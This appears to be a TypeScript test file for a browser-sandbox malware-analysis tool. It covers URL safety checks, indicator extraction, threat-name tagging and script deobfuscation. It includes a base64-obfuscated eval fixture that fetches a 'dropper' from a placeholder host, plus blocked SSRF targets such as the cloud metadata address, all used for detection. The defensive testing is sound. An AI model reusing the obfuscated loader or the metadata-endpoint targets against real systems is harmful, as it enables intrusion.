import { strict as assert } from 'node:assert'
import {
    extractIndicators,
    extractThreatAssociations,
    inspectScript,
    sandboxUrlSafety,
    summarizeDeobfuscationTask,
} from '../src/handlers/onionSession/analysis.ts'
import { parseCymruAsn, providerSummaryText } from '../src/handlers/onionSession/ws.ts'

assert.deepEqual(sandboxUrlSafety('https://example.com/path'), { ok: true })
assert.equal(sandboxUrlSafety('ftp://example.com').ok, false)
assert.equal(sandboxUrlSafety('http://127.0.0.1/admin').ok, false)
assert.equal(sandboxUrlSafety('http://169.254.169.254/latest/meta-data').ok, false)
assert.equal(sandboxUrlSafety('http://metadata.google.internal/computeMetadata/v1').ok, false)
assert.equal(sandboxUrlSafety('http://user:pass@example.com').ok, false)
assert.equal(sandboxUrlSafety('http://[::1]/').ok, false)

const indicators = extractIndicators('Visit https://stage.example.net/a.js then 203.0.113.44 and bad.example.net.')
assert(indicators.urls.includes('https://stage.example.net/a.js'), 'extracts full URLs for copyable IOC lists')
assert(indicators.ips.includes('203.0.113.44'), 'extracts IPv4 indicators')
assert(indicators.domains.includes('bad.example.net'), 'extracts domain indicators')
assert(!extractIndicators('999.1.1.1').ips.includes('999.1.1.1'), 'rejects impossible IPv4 octets')

const associations = extractThreatAssociations('Tool output: campaign associated with LockBit ransomware and Cobalt Strike beacons.', 'tool_context')
assert(associations.some(item => item.name === 'LockBit' && item.confidence === 'high'), 'extracts high-confidence ransomware context')
assert(associations.some(item => item.name === 'Cobalt Strike'), 'extracts tool context')
assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a new name.', 'tool_context').length, 0, 'ignores bare provider-page name mentions')

const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
const task = summarizeDeobfuscationTask(script)
assert.match(script.sha256, /^[a-f0-9]{64}$/, 'records a script SHA-256 for analyst evidence')
assert.equal(task.sha256, script.sha256, 'carries script SHA-256 into WebCrack/deobfuscation evidence')
assert.equal(task.assessment, 'suspicious')
assert(task.decodedTransforms.includes('base64 string'), 'records base64 decoding')
assert(task.indicators.domains.includes('payload.example.com'), 'decoded indicators include second-stage domain')
assert(task.summary.includes('decoded network indicators'), 'summarizes why decoded script is suspicious')
assert.equal(parseCymruAsn([['15169 | 8.8.8.0/24 | US | arin | 2023-12-28']]), '15169', 'parses Team Cymru ASN TXT rows')

const providerSummary = providerSummaryText(JSON.stringify({ last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 80, undetected: 12, timeout: 0 } }) + '<td>0 - 1 - 2</td>')
assert(providerSummary.includes('3/95 security vendors'), 'summarizes VirusTotal stats before provider text is trimmed')
assert(providerSummary.includes('3 urlquery alerts'), 'summarizes urlquery score rows before provider text is trimmed')

console.log('Browser sandbox analysis helpers passed.')
